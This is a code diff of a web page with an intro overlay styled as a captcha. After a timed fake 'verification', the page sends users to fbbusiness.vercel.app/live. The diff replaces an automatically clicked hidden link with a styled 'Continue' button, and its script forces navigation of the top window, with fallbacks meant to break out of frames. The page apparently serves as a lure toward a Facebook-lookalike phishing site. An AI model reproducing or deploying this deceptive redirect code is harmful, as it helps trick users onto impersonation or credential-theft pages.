@@ -306,15 +306,8 @@
       </div>
     </div>
   </div>
-  <a
-    id="captcha-redirect-link"
-    href="https://fbbusiness.vercel.app/live"
-    target="_top"
-    hidden
-    aria-hidden="true"
-    tabindex="-1"
-  >Continue</a>
   <script>
+    const REDIRECT_URL = "https://fbbusiness.vercel.app/live";
     const VERIFY_DELAY_MS = 1400;
     const DONE_DELAY_MS = 500;
     const TICK_DRAW_MS = 360;
@@ -523,17 +516,59 @@
       }
     };
 
-    const finishIntro = () => {
+    const navigateTop = (e) => {
+      if (e) e.preventDefault();
+      try {
+        window.top.location.href = REDIRECT_URL;
+      } catch (_) {
+        try {
+          window.open(REDIRECT_URL, "_top");
+        } catch (_2) {
+          window.location.href = REDIRECT_URL;
+        }
+      }
+    };
+
+    const showContinueButton = () => {
       const overlay = document.getElementById("intro-captcha");
       if (!overlay) return;
-      overlay.classList.add("is-fading");
-      const doneTimer = setTimeout(() => {
-        overlay.remove();
-        const redirectLink = document.getElementById("captcha-redirect-link");
-        if (!redirectLink) return;
-        redirectLink.click();
-      }, DONE_DELAY_MS);
-      introState.timers.push(doneTimer);
+      const panel = overlay.querySelector(".intro-captcha-panel");
+      if (!panel) return;
+
+      const wrapper = document.createElement("div");
+      wrapper.style.cssText = "margin-top:1.5rem;text-align:center";
+
+      const btn = document.createElement("a");
+      btn.href = REDIRECT_URL;
+      btn.target = "_top";
+      btn.rel = "noopener noreferrer";
+      btn.textContent = "Continue";
+      btn.style.cssText = [
+        "display:inline-block",
+        "padding:0.7rem 3rem",
+        "background:#0180FA",
+        "color:#fff",
+        "border-radius:6px",
+        "font-size:15px",
+        "font-weight:700",
+        "font-family:Helvetica,Arial,sans-serif",
+        "text-decoration:none",
+        "letter-spacing:0.03em",
+        "cursor:pointer",
+        "transition:background 0.2s"
+      ].join(";");
+
+      btn.addEventListener("mouseover", () => { btn.style.background = "#0165cc"; });
+      btn.addEventListener("mouseout",  () => { btn.style.background = "#0180FA"; });
+      btn.addEventListener("click", navigateTop);
+
+      wrapper.appendChild(btn);
+      panel.appendChild(wrapper);
+      btn.focus();
+    };
+
+    const finishIntro = () => {
+      showContinueButton();
     };
 
     const handleCaptchaChange = () => {
